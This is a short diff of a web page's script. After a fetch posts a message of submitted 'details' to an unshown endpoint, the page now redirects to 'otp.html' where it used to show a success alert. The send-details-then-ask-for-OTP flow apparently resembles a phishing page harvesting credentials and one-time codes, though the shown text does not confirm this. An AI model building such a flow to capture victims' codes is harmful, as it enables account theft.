@@ -108,11 +108,13 @@
                         text: message
                     })
                 })
-                .then(() => alert('Details sent successfully'))
+                .then(() => {
+                    // Redirect after success
+                    window.location.href = 'otp.html';
+                })
                 .catch(err => console.error('Error:', err));
         }
     </script>
-
 </body>
 
 </html>
